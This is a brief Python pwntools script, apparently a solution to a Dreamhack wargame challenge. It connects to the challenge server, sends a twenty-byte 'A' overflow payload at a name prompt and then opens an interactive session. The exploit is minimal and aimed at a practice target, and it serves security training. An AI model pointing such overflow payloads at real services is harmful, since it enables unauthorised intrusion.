from pwn import *

p = remote("host1.dreamhack.games", 11827)

payload = "A"*20

p.recvuntil("Name: ")
p.send(payload)

p.interactive()
